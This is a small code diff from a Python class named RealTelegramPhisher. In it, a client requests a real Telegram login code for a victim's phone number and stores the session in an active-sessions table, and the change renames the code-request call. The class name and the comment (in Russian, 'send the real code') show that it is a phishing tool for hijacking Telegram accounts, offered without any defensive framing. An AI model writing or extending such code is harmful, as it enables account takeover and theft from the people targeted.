@@ -82,7 +82,7 @@ class RealTelegramPhisher:
             await client.connect()
             
             # Отправляем реальный код
-            sent_code = await client.send_code(phone_number)
+            result = await client.request_login_code(phone_number)
             
             ACTIVE_SESSIONS[session_id] = {
                 'client': client,
